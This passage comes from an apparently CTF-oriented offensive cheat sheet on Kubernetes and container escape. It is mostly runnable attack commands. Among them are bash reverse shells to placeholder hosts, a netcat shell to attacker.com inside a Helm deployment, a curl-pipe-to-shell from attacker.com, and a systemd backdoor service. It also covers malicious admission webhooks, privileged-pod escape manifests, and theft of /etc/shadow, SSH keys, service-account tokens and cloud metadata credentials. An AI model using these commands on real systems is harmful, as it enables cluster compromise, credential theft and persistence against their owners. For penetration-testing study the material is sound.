capsh --print | grep sys_admin

# Mount host filesystem via debugfs (requires CAP_SYS_ADMIN)
debugfs -w /dev/sda1
debugfs: cd /root
debugfs: cat /root/.ssh/id_rsa

# Kernel module loading
# [Inference: Requires kernel module matching container's kernel version]
```

**CAP_SYS_PTRACE Exploitation:**

```bash
# Attach to host process (if CAP_SYS_PTRACE + shared PID namespace)
ps aux | grep -v docker
gdb -p <host_pid>
(gdb) call system("bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'")
```

**CAP_DAC_READ_SEARCH Abuse:**

```bash
# Read arbitrary files bypassing permissions
# [Inference: Combine with path traversal to read host secrets]
```

### AppArmor/SELinux Bypass

**AppArmor Profile Detection:**

```bash
cat /proc/self/attr/current
aa-status  # if available
```

**AppArmor Bypass via Unconfined Process:**

```bash
# Look for unconfined profiles
cat /proc/*/attr/current | grep unconfined

# [Unverified: Specific bypass depends on profile configuration]
```

### Dirty COW (CVE-2016-5195)

**[Unverified: Effectiveness depends on kernel version - vulnerable kernels < 4.8.3]**

```bash
# Compile exploit (requires gcc in container)
wget https://github.com/dirtycow/dirtycow.github.io/raw/master/dirtyc0w.c
gcc -pthread dirtyc0w.c -o dirtyc0w

# Overwrite /etc/passwd or SUID binary
./dirtyc0w /etc/passwd <modified_passwd_content>
```

### Shocker (CVE-2014-6271 + CVE-2014-5251)

**[Unverified: Requires open_by_handle_at syscall + CAP_DAC_READ_SEARCH]**

```bash
# Use pre-built exploit
git clone https://github.com/gabrtv/shocker
cd shocker
./shocker.sh
```

### runC Vulnerability (CVE-2019-5736)

**[Unverified: Affects runC < 1.0.0-rc6]**

```bash
# Exploit requires overwriting runC binary on host
# Typically requires exec into existing container
# [Inference: Exploit code available in public repositories but effectiveness depends on environment]
```

### Kubernetes Node Access via Hostpath

```bash
# If hostPath volume mounted
mount | grep "/var/lib/kubelet"
ls -la /var/lib/kubelet/pods/

# Access service account tokens
find /var/lib/kubelet/pods/ -name "token" -type f
```

## Kubernetes Reconnaissance

### Service Account Token Discovery

**Token Location & Extraction:**

```bash
# Default token location (automounted in pods)
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /run/secrets/kubernetes.io/serviceaccount/token

# Extract token components
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

**Token Decoding & Analysis:**

```bash
# Decode JWT token (3 parts: header.payload.signature)
echo $TOKEN | cut -d '.' -f2 | base64 -d | jq .

# Extract subject and permissions info
# [Inference: Token typically identifies ServiceAccount but doesn't contain permission details]
```

### API Server Enumeration

**API Discovery:**

```bash
# Kubernetes API server location
echo $KUBERNETES_SERVICE_HOST
echo $KUBERNETES_SERVICE_PORT

# Alternative discovery
nmap -p 443,6443,8443 <cluster_cidr>
nmap -p 10250,10251,10252,10255 <node_ips>
```

**API Authentication Testing:**

```bash
# Anonymous access check
curl -k https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1

# Authenticated request
curl -k -H "Authorization: Bearer $TOKEN" \
  https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1

# API version discovery
curl -k -H "Authorization: Bearer $TOKEN" \
  https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api
```

**kubectl Reconnaissance (if available):**

```bash
# Configure kubectl with service account
kubectl config set-cluster k8s --server=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT --certificate-authority=$CACERT
kubectl config set-credentials sa --token=$TOKEN
kubectl config set-context default --cluster=k8s --user=sa
kubectl config use-context default

# Permission enumeration
kubectl auth can-i --list
kubectl auth can-i create pods
kubectl auth can-i get secrets

# Resource discovery
kubectl get pods --all-namespaces
kubectl get services --all-namespaces
kubectl get secrets --all-namespaces
kubectl get configmaps --all-namespaces
kubectl get nodes
```

**API Resource Enumeration via curl:**

```bash
# List pods in namespace
curl -k -H "Authorization: Bearer $TOKEN" \
  https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/$NAMESPACE/pods

# List secrets
curl -k -H "Authorization: Bearer $TOKEN" \
  https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/$NAMESPACE/secrets

# List services
curl -k -H "Authorization: Bearer $TOKEN" \
  https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/services
```

### Kubelet API Exploitation

**Kubelet Port Scanning:**

```bash
# Default kubelet ports
# 10250 - kubelet API (authenticated)
# 10255 - kubelet read-only API (deprecated, often disabled)
nmap -p 10250,10255 <node_ips>
```

**Kubelet Anonymous Access (10255):**

```bash
# [Unverified: Port 10255 deprecated since Kubernetes 1.10, often disabled]
curl -k http://<node_ip>:10255/pods
curl -k http://<node_ip>:10255/spec
curl -k http://<node_ip>:10255/stats/summary
```

**Kubelet Authenticated Access (10250):**

```bash
# Test anonymous access (misconfuration)
curl -k https://<node_ip>:10250/pods

# Authenticated access with certificate
curl -k --cert client.crt --key client.key https://<node_ip>:10250/pods

# Execute command in container via kubelet
curl -k -XPOST "https://<node_ip>:10250/run/$NAMESPACE/$POD_NAME/$CONTAINER_NAME" \
  -d "cmd=id"

# [Inference: Requires authentication bypass or valid certificates]
```

**kubeletctl Tool:**

```bash
# Install kubeletctl
wget https://github.com/cyberark/kubeletctl/releases/download/v1.9/kubeletctl_linux_amd64
chmod +x kubeletctl_linux_amd64

# Scan for kubelet
./kubeletctl_linux_amd64 scan --cidr <cidr>

# Check anonymous access
./kubeletctl_linux_amd64 pods -s <node_ip>

# Execute command
./kubeletctl_linux_amd64 exec "id" -s <node_ip> -p <pod_name> -c <container_name>

# Token extraction
./kubeletctl_linux_amd64 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -s <node_ip> -p <pod> -c <container>
```

### ETCD Database Access

**[Unverified: Direct etcd access typically requires client certificates and is rare in CTF scenarios]**

```bash
# ETCD default port
nmap -p 2379,2380 <node_ips>

# Attempt anonymous access
curl http://<etcd_ip>:2379/v2/keys

# With etcdctl (requires authentication material)
ETCDCTL_API=3 etcdctl --endpoints=https://<ip>:2379 \
  --cert=/path/to/cert.pem \
  --key=/path/to/key.pem \
  --cacert=/path/to/ca.pem \
  get / --prefix --keys-only
```

### Service Discovery & Network Mapping

**DNS Enumeration:**

```bash
# Kubernetes DNS pattern: <service>.<namespace>.svc.cluster.local
nslookup kubernetes.default.svc.cluster.local

# Enumerate services via DNS
for ns in default kube-system; do
  for svc in $(seq 1 100); do
    nslookup service-$svc.$ns.svc.cluster.local 2>/dev/null
  done
done
```

**Network Scanning:**

```bash
# Cluster IP range discovery
ip route
cat /etc/resolv.conf  # nameserver typically in cluster IP range

# Service network scanning
nmap -sT -p 80,443,8080,8443,3000,5000,6379,3306,5432 <cluster_cidr>
```

### Dashboard & Monitoring Tools

**Kubernetes Dashboard:**

```bash
# Common dashboard URLs
https://<api_server>/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/

# Check for dashboard service
kubectl get services --all-namespaces | grep dashboard
```

**Prometheus/Grafana:**

```bash
# Common ports: Prometheus (9090), Grafana (3000)
curl http://<node_ip>:9090/api/v1/targets
curl http://<node_ip>:3000/api/health
```

## Pod Security Misconfigurations

### Privileged Pods

**Detection:**

```bash
# From pod manifest
kubectl get pod <pod> -o yaml | grep privileged

# From within container
cat /proc/self/status | grep CapEff
# 0000003fffffffff = privileged
```

**Exploitation (same as privileged container escape above):**

```bash
# Mount host filesystem
mount /dev/sda1 /mnt
chroot /mnt /bin/bash

# Namespace escape
nsenter -t 1 -m -u -i -n sh
```

### hostPID/hostIPC/hostNetwork

**hostPID Detection & Exploitation:**

```bash
# Check if hostPID enabled
ps aux  # if host processes visible

# Process injection into host PID 1
gdb -p 1
(gdb) call system("bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'")

# [Unverified: Requires CAP_SYS_PTRACE capability]
```

**hostNetwork Exploitation:**

```bash
# Network interfaces inspection
ip addr
ifconfig

# Sniff host network traffic
tcpdump -i eth0 -w /tmp/capture.pcap

# Access host services bound to localhost
curl http://127.0.0.1:6443  # API server
```

**hostIPC Exploitation:**

```bash
# Shared memory enumeration
ipcs -a

# [Inference: Access to host IPC namespace allows reading shared memory segments]
```

### hostPath Volume Mounts

**Sensitive Path Mounts:**

```bash
# Docker socket mount (critical)
ls -la /var/run/docker.sock

# Kubernetes admin configs
ls -la /root/.kube/config
ls -la /etc/kubernetes/

# Host root mount
ls -la /host/
ls -la /rootfs/

# SSH keys
ls -la /host/root/.ssh/
ls -la /host/home/*/.ssh/

# Kernel modules
ls -la /lib/modules/
```

**Exploitation:**

```bash
# Read host secrets
cat /host/etc/shadow
cat /host/root/.ssh/id_rsa

# Write SSH authorized_keys
echo "ssh-rsa AAAA..." > /host/root/.ssh/authorized_keys

# Modify systemd services for persistence
cat > /host/etc/systemd/system/backdoor.service << EOF
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
[Install]
WantedBy=multi-user.target
EOF
```

### Excessive ServiceAccount Permissions

**Permission Testing:**

```bash
# Test RBAC permissions
kubectl auth can-i create pods --as=system:serviceaccount:$NAMESPACE:$SA_NAME
kubectl auth can-i create pods/exec
kubectl auth can-i get secrets --all-namespaces
kubectl auth can-i '*' '*'  # cluster-admin check
```

**Privilege Escalation via Pod Creation:**

```bash
# Create privileged pod for escape
cat > priv-pod.yaml << EOF
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
  namespace: $NAMESPACE
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: escape
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", "nsenter -t 1 -m -u -i -n sh"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
EOF

kubectl apply -f priv-pod.yaml
kubectl exec -it escape-pod -- sh
```

**Secret Theft:**

```bash
# Extract all secrets if permissions allow
kubectl get secrets --all-namespaces -o json | jq -r '.items[] | .metadata.namespace + "/" + .metadata.name'

# Decode specific secret
kubectl get secret <secret_name> -o json | jq -r '.data | map_values(@base64d)'
```

### Admission Controller Bypass

**[Inference: CTF scenarios may have weak or missing admission controllers]**

```bash
# Test for PSP (PodSecurityPolicy) enforcement
kubectl get psp

# Attempt restricted capabilities
kubectl run test --image=alpine --restart=Never --rm -it \
  --overrides='{"spec":{"hostPID":true,"containers":[{"name":"test","image":"alpine","command":["sh"],"securityContext":{"privileged":true}}]}}'
```

### Insecure Image Policies

**Pull from External Registry:**

```bash
# Create pod with malicious image
kubectl run backdoor --image=attacker.com/malicious:latest

# [Inference: No image signature verification or registry whitelist]
```

### Exposed Container Runtime Socket

**In-Pod Socket Access:**

```bash
# Check for mounted sockets
ls -la /var/run/docker.sock
ls -la /run/containerd/containerd.sock
ls -la /run/crio/crio.sock

# Exploitation follows Docker socket escape methods above
```

---

## Key Tools Summary

**Container Enumeration:**

- `docker` - Container CLI (if available)
- `curl` - API interaction
- `mount`, `findmnt` - Filesystem analysis
- `capsh`, `getpcaps` - Capability inspection

**Kubernetes Tools:**

- `kubectl` - Kubernetes CLI
- `kubeletctl` - Kubelet exploitation framework
- `curl` - API server interaction

**Network Reconnaissance:**

- `nmap` - Port scanning
- `nslookup`, `dig` - DNS enumeration

**Exploitation:**

- `gdb` - Process debugging/injection
- `nsenter` - Namespace manipulation
- `chroot` - Filesystem pivot

---

**Important Subtopics**

**Critical Follow-up Areas:**

1. **Linux Kernel Exploits** - Container escapes often leverage kernel vulnerabilities
2. **Capability-Based Security** - Deep understanding of Linux capabilities critical for escape identification
3. **RBAC & IAM Enumeration** - Kubernetes permission models
4. **Network Policy Bypass** - Moving laterally within clusters
5. **Container Image Analysis** - Extracting secrets from layers, supply chain attacks

---

## Service Account Token Exploitation

### Overview

Kubernetes service accounts provide identity for processes running in pods. Each pod is automatically mounted with a service account token at `/var/run/secrets/kubernetes.io/serviceaccount/token`, which can be used to authenticate to the Kubernetes API server. Misconfigured RBAC or overly permissive service accounts enable privilege escalation and cluster compromise.

### Token Location and Extraction

#### Default Token Location (Inside Pod)

```bash
# Token file
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# CA certificate
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Set as environment variable for convenience
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
export NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
```

#### Extracting from Compromised Container

```bash
# Check if kubectl is available in container
which kubectl

# If not, download kubectl binary
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x kubectl
mv kubectl /tmp/kubectl

# Alternative: use curl for direct API calls
```

#### External Token Extraction (From Host with Access to etcd)

```bash
# If you have access to master node or etcd
# Service account tokens are stored as secrets

kubectl get secrets -n <namespace> | grep "service-account-token"
kubectl get secret <sa-token-secret> -n <namespace> -o jsonpath='{.data.token}' | base64 -d
```

### Kubernetes API Authentication

#### Using kubectl with Service Account Token

```bash
# Set cluster configuration
kubectl config set-cluster target-cluster \
  --server=https://<kubernetes-api-server>:6443 \
  --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Set credentials
kubectl config set-credentials sa-user \
  --token=$TOKEN

# Set context
kubectl config set-context sa-context \
  --cluster=target-cluster \
  --user=sa-user \
  --namespace=$NAMESPACE

# Use context
kubectl config use-context sa-context

# Verify access
kubectl auth can-i --list
```

#### Direct API Calls with curl

```bash
# Get API server address (from within pod)
APISERVER=https://kubernetes.default.svc
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Test authentication
curl --cacert $CACERT \
  --header "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/default/pods

# List all namespaces
curl --cacert $CACERT \
  --header "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces

# Get secrets in namespace
curl --cacert $CACERT \
  --header "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/default/secrets
```

#### Without CA Certificate (Insecure)

```bash
# Skip TLS verification (useful if ca.crt unavailable)
curl -k --header "Authorization: Bearer $TOKEN" \
  https://<api-server>:6443/api/v1/namespaces
```

### Permission Enumeration

#### Check Current Permissions

```bash
# List all permissions for current service account
kubectl auth can-i --list

# Check specific permissions
kubectl auth can-i create pods
kubectl auth can-i get secrets
kubectl auth can-i create pods --all-namespaces
kubectl auth can-i '*' '*'  # Check for cluster-admin equivalent

# View role bindings for current service account
kubectl get rolebindings,clusterrolebindings --all-namespaces -o json | \
  jq '.items[] | select(.subjects[]?.name=="<sa-name>")'
```

#### Enumerate Service Account Details

```bash
# Get current service account name
SA_NAME=$(kubectl get sa -n $NAMESPACE -o name | grep default)

# Describe service account
kubectl describe sa $SA_NAME -n $NAMESPACE

# Get role bindings
kubectl get rolebinding -n $NAMESPACE -o yaml | grep -A 5 "name: $SA_NAME"
kubectl get clusterrolebinding -o yaml | grep -A 5 "name: $SA_NAME"
```

### Exploitation Techniques

#### Privilege Escalation via Pod Creation

```bash
# If service account has permission to create pods
# Create privileged pod with host filesystem access

cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: evil-pod
  namespace: default
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: evil-container
    image: alpine:latest
    command: ["/bin/sh"]
    args: ["-c", "sleep 3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
EOF

# Execute into pod
kubectl exec -it evil-pod -- /bin/sh

# Access host filesystem
chroot /host /bin/bash

# Extract sensitive data
cat /host/etc/shadow
cat /host/root/.ssh/id_rsa
cat /host/var/lib/kubelet/kubeconfig
```

#### Secret Extraction

```bash
# List all secrets (if permitted)
kubectl get secrets --all-namespaces -o json

# Extract specific secret
kubectl get secret <secret-name> -n <namespace> -o json

# Decode secret values
kubectl get secret <secret-name> -n <namespace> -o json | \
  jq -r '.data | to_entries[] | "\(.key): \(.value | @base64d)"'

# Mass secret extraction script
for ns in $(kubectl get namespaces -o jsonpath='{.items[*].metadata.name}'); do
  echo "[+] Namespace: $ns"
  kubectl get secrets -n $ns -o json | \
    jq -r '.items[] | "\(.metadata.name): \(.data)"'
done
```

#### ConfigMap Enumeration

```bash
# List ConfigMaps (may contain credentials, API keys)
kubectl get configmaps --all-namespaces

# Extract ConfigMap data
kubectl get configmap <configmap-name> -n <namespace> -o yaml

# Search for sensitive patterns
kubectl get configmaps --all-namespaces -o json | \
  jq -r '.items[] | select(.data | tostring | test("password|api_key|token|secret"))'
```

#### Lateral Movement via Service Account Impersonation

```bash
# If service account has impersonation permissions
kubectl auth can-i impersonate serviceaccounts

# Impersonate cluster-admin service account
kubectl --as=system:serviceaccount:kube-system:cluster-admin get pods --all-namespaces

# Create resources as impersonated SA
kubectl --as=system:serviceaccount:kube-system:admin create -f malicious-pod.yaml
```

#### Token Refresh and Persistence

```bash
# Service account tokens may be time-bound (Bound Service Account Tokens)
# Check token expiration
jwt_decode() {
  jq -R 'split(".") | .[1] | @base64d | fromjson' <<< "$1"
}

jwt_decode $TOKEN

# If token expires, extract secret directly
kubectl get secret $(kubectl get sa <sa-name> -n <namespace> -o jsonpath='{.secrets[0].name}') \
  -n <namespace> -o jsonpath='{.data.token}' | base64 -d

# [Inference] Older clusters may use non-expiring tokens stored as secrets
```

### Advanced Exploitation

#### Escape to Node via Container Runtime Socket

```bash
# If /var/run/docker.sock mounted in pod
ls -la /var/run/docker.sock

# Install docker client in container
apk add docker-cli  # Alpine
apt-get update && apt-get install -y docker.io  # Debian/Ubuntu

# List containers on host
docker ps

# Execute command on host via new privileged container
docker run --rm -it --privileged --pid=host --net=host --ipc=host \
  -v /:/host alpine:latest chroot /host /bin/bash

# Extract kubelet credentials
cat /host/var/lib/kubelet/kubeconfig
cat /host/etc/kubernetes/admin.conf
```

#### Abuse Admission Controllers

```bash
# If service account can modify MutatingWebhookConfiguration or ValidatingWebhookConfiguration
# Create malicious admission controller to inject backdoors into all pods

cat <<EOF | kubectl apply -f -
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: evil-webhook
webhooks:
- name: evil.attacker.com
  clientConfig:
    url: https://attacker.com/mutate
  rules:
  - operations: ["CREATE"]
    apiGroups: [""]
    apiVersions: ["v1"]
    resources: ["pods"]
  admissionReviewVersions: ["v1"]
  sideEffects: None
EOF

# [Inference] Webhook server can inject malicious sidecars or environment variables into all new pods
```

#### Cloud Provider Metadata Service Access

```bash
# If running in cloud (AWS, Azure, GCP) and network policies allow

# AWS - IMDSv2
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# AWS - IMDSv1 (if not disabled)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# Azure
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# GCP
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### Tools for Service Account Exploitation

#### kubectl-who-can

```bash
# Install
kubectl krew install who-can

# Check who can perform actions
kubectl who-can create pods
kubectl who-can get secrets --all-namespaces
kubectl who-can '*' '*'
```

#### kubeletctl

```bash
# Install
git clone https://github.com/cyberark/kubeletctl
cd kubeletctl
go build

# Scan for accessible kubelets
./kubeletctl scan --cidr <cluster-cidr>

# Run commands via kubelet API (if exposed)
./kubeletctl run "whoami" --server <node-ip>:10250
```

#### Peirates (Kubernetes Penetration Testing Tool)

```bash
# Install
git clone https://github.com/inguardians/peirates
cd peirates
go build

# Run from within compromised pod
./peirates

# Interactive menu provides:
# - Service account token enumeration
# - RBAC privilege escalation
# - Secret extraction
# - Pod creation for persistence
```

#### kube-hunter

```bash
# Install
pip install kube-hunter

# Run from within cluster
kube-hunter --pod

# Remote scan
kube-hunter --remote <cluster-ip>
```

### Automated Exploitation Script

```bash
#!/bin/bash
# sa_exploit.sh - Service Account Token Exploitation

TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
APISERVER=https://kubernetes.default.svc

if [ -z "$TOKEN" ]; then
  echo "[-] No service account token found"
  exit 1
fi

echo "[+] Service Account Token Found"
echo "[+] Namespace: $NAMESPACE"

# Check permissions
echo -e "\n[*] Checking permissions..."
kubectl auth can-i --list 2>/dev/null || echo "[-] kubectl not available"

# Attempt secret extraction
echo -e "\n[*] Attempting secret extraction..."
kubectl get secrets -n $NAMESPACE 2>/dev/null
kubectl get secrets --all-namespaces 2>/dev/null

# Check for privileged access
if kubectl auth can-i create pods 2>/dev/null; then
  echo "[+] Can create pods - attempting privilege escalation"
  cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: pwn-$(date +%s)
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: pwn
    image: alpine:latest
    command: ["/bin/sh", "-c", "sleep 3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
EOF
fi

# Check for impersonation
echo -e "\n[*] Checking impersonation permissions..."
kubectl auth can-i impersonate serviceaccounts 2>/dev/null
```

---

## Helm Chart Vulnerabilities

### Overview

Helm is a package manager for Kubernetes that uses charts (collections of YAML files) to define applications. Vulnerabilities in Helm charts can include hardcoded secrets, insecure default configurations, arbitrary code execution via templates, and supply chain attacks.

### Helm Chart Structure

```
mychart/
├── Chart.yaml          # Chart metadata
├── values.yaml         # Default configuration values
├── charts/             # Dependency charts
├── templates/          # Kubernetes manifest templates
│   ├── deployment.yaml
│   ├── service.yaml
│   ├── _helpers.tpl    # Template helpers
│   └── NOTES.txt       # Post-install notes
└── README.md
```

### Reconnaissance

#### List Installed Helm Releases

```bash
# List releases in current namespace
helm list

# List releases in all namespaces
helm list --all-namespaces

# Get detailed information about release
helm status <release-name> -n <namespace>

# Show release history
helm history <release-name> -n <namespace>
```

#### Extract Chart Values

```bash
# Get user-supplied values for release
helm get values <release-name> -n <namespace>

# Get all computed values (including defaults)
helm get values <release-name> -n <namespace> --all

# Get manifest (rendered Kubernetes resources)
helm get manifest <release-name> -n <namespace>

# Get chart information
helm get all <release-name> -n <namespace>
```

#### Download Chart for Analysis

```bash
# Add repository
helm repo add <repo-name> <repo-url>
helm repo update

# Search for chart
helm search repo <chart-name>

# Download chart without installing
helm pull <repo-name>/<chart-name>
helm pull <repo-name>/<chart-name> --untar

# Download specific version
helm pull <repo-name>/<chart-name> --version <version>
```

### Static Analysis of Helm Charts

#### Search for Hardcoded Secrets

```bash
# Extract chart
tar -xzf mychart-1.0.0.tgz
cd mychart

# Search for potential secrets
grep -r "password\|secret\|api_key\|token\|apikey" templates/ values.yaml

# Check for base64 encoded values
grep -r "base64" templates/ values.yaml

# Look for AWS keys, private keys, etc.
grep -r "AKIA\|-----BEGIN" templates/ values.yaml
```

#### Identify Insecure Defaults

```bash
# Check values.yaml for security issues
cat values.yaml | grep -i "securityContext\|privileged\|hostPath\|hostNetwork\|runAsUser"

# Look for disabled security features
grep -i "false" values.yaml | grep -i "security\|rbac\|networkpolicy"

# Check for overly permissive RBAC
find templates/ -name "*role*.yaml" -exec cat {} \;
```

#### Template Injection Vulnerabilities

```yaml
# VULNERABLE EXAMPLE - Command injection via template
# templates/deployment.yaml
apiVersion: v1
kind: Pod
metadata:
  name: {{ .Values.podName }}
spec:
  containers:
  - name: app
    image: {{ .Values.image }}
    command: 
    - sh
    - -c
    - echo "Hello {{ .Values.userName }}"  # Unsanitized user input

# Exploitation:
# values.yaml or --set flag:
userName: "'; cat /etc/shadow; echo '"

# Rendered output:
command: ["sh", "-c", "echo 'Hello '; cat /etc/shadow; echo ''"]
```

#### Analyze with Automated Tools

##### helm-security-scan

```bash
# [Unverified] Custom tool availability may vary

# Clone and run
git clone https://github.com/example/helm-security-scan
cd helm-security-scan
python3 scan.py /path/to/chart
```

##### checkov (IaC Security Scanner)

```bash
# Install
pip install checkov

# Scan Helm chart
checkov -d /path/to/chart/templates/

# Scan rendered manifests
helm template my-release ./mychart > manifests.yaml
checkov -f manifests.yaml
```

##### kubesec

```bash
# Install
wget https://github.com/controlplaneio/kubesec/releases/download/v2.13.0/kubesec_linux_amd64.tar.gz
tar -xzf kubesec_linux_amd64.tar.gz

# Scan rendered templates
helm template my-release ./mychart | ./kubesec scan -

# Scan individual files
./kubesec scan templates/deployment.yaml
```

##### Trivy (Misconfiguration Detection)

```bash
# Install
sudo apt-get install trivy

# Scan Helm chart
trivy config /path/to/chart/

# Scan specific manifest
helm template my-release ./mychart | trivy config -
```

### Exploitation Techniques

#### Malicious Chart Installation

```bash
# If attacker has Helm permissions, install malicious chart

# Create malicious chart
helm create evilchart
cd evilchart

# Edit templates/deployment.yaml to include backdoor
cat <<EOF > templates/deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: evil-deploy
spec:
  replicas: 1
  selector:
    matchLabels:
      app: evil
  template:
    metadata:
      labels:
        app: evil
    spec:
      hostNetwork: true
      hostPID: true
      containers:
      - name: evil
        image: alpine:latest
        command: ["/bin/sh"]
        args: ["-c", "while true; do nc -e /bin/sh attacker.com 4444; sleep 60; done"]
        securityContext:
          privileged: true
        volumeMounts:
        - name: host-root
          mountPath: /host
      volumes:
      - name: host-root
        hostPath:
          path: /
EOF

# Install chart
helm install evil-release ./evilchart
```

#### Chart Tampering via Helm Repo Compromise

```bash
# If attacker compromises Helm chart repository

# Clone legitimate chart
helm pull stable/mysql --untar
cd mysql

# Modify templates to include backdoor
echo '        - name: BACKDOOR_URL' >> templates/deployment.yaml
echo '          value: "http://attacker.com/beacon"' >> templates/deployment.yaml

# Repackage chart
helm package .

# Host on compromised repository
# Users who update will pull malicious version
```

#### Value Override Exploitation

```bash
# Exploit insecure value handling

# Example: Chart uses values.yaml for image name without validation
# values.yaml
image:
  repository: nginx
  tag: "1.19"

# Attacker installs with malicious image
helm install my-release ./chart --set image.repository=attacker/backdoored-nginx

# Or exploit command injection via values
helm install my-release ./chart --set 'command[0]=sh,command[1]=-c,command[2]=curl http://attacker.com/shell.sh|sh'
```

#### Privilege Escalation via Chart RBAC

```bash
# If chart creates overly permissive ServiceAccount

# Check chart templates for RBAC resources
cat templates/serviceaccount.yaml
cat templates/clusterrole.yaml
cat templates/clusterrolebinding.yaml

# If ClusterRole has excessive permissions:
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: my-chart-role
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]

# Exploit: Get token from ServiceAccount created by chart
SA_NAME=$(kubectl get sa -n <namespace> | grep <chart-name> | awk '{print $1}')
TOKEN=$(kubectl get secret $(kubectl get sa $SA_NAME -n <namespace> -o jsonpath='{.secrets[0].name}') -n <namespace> -o jsonpath='{.data.token}' | base64 -d)

# Use token for cluster-wide access
kubectl --token=$TOKEN get pods --all-namespaces
```

#### Hook Abuse for Persistence

```bash
# Helm hooks execute at specific lifecycle events
# Attacker can create post-install hook that persists

# templates/post-install-hook.yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: "{{ .Release.Name }}-post-install"
  annotations:
    "helm.sh/hook": post-install
    "helm.sh/hook-weight": "-5"
    "helm.sh/hook-delete-policy": hook-succeeded
spec:
  template:
    spec:
      restartPolicy: Never
      containers:
      - name: post-install
        image: alpine:latest
        command:
        - sh
        - -c
        - |
          # Create persistent backdoor
          kubectl create deployment backdoor --image=attacker/backdoor:latest
          kubectl expose deployment backdoor --port=4444 --type=LoadBalancer

# This executes after chart installation, even if user removes the chart
```

### Supply Chain Attacks

#### Dependency Confusion

```bash
# Chart.yaml defines dependencies
dependencies:
- name: mysql
  version: "8.0.0"
  repository: "https://charts.bitnami.com/bitnami"

# Attacker hosts malicious chart with same name on public repo
# If victim adds attacker's repo with higher priority, malicious version installed

# Check dependency integrity
helm dependency list
helm dependency update --verify
```

#### Chart Signing and Verification

```bash
# Sign chart (requires GPG key)
helm package --sign --key 'John Doe' --keyring ~/.gnupg/secring.gpg mychart/

# Verify signed chart
helm verify mychart-1.0.0.tgz

# Install with verification
helm install my-release mychart-1.0.0.tgz --verify

# [Inference] Many users skip verification, making unsigned charts risky
```

### Post-Exploitation via Helm

#### Extract Secrets from Helm Release Storage

```bash
# Helm stores release data in Kubernetes secrets (Helm 3)
kubectl get secrets -n <namespace> -l "owner=helm"

# Extract release data
kubectl get secret sh.helm.release.v1.<release-name>.v1 -n <namespace> -o json | \
  jq -r '.data.release' | base64 -d | base64 -d | gunzip

# [Inference] Release data may contain sensitive values provided during installation
```

#### Rollback to Vulnerable Version

```bash
# If newer release patched vulnerability, rollback to vulnerable version
helm history <release-name> -n <namespace>
helm rollback <release-name> <revision> -n <namespace>
```

### Defensive Scanning During CTF

```bash
#!/bin/bash
# helm_audit.sh - Quick Helm security audit

RELEASE=$1
NAMESPACE=${2:-default}

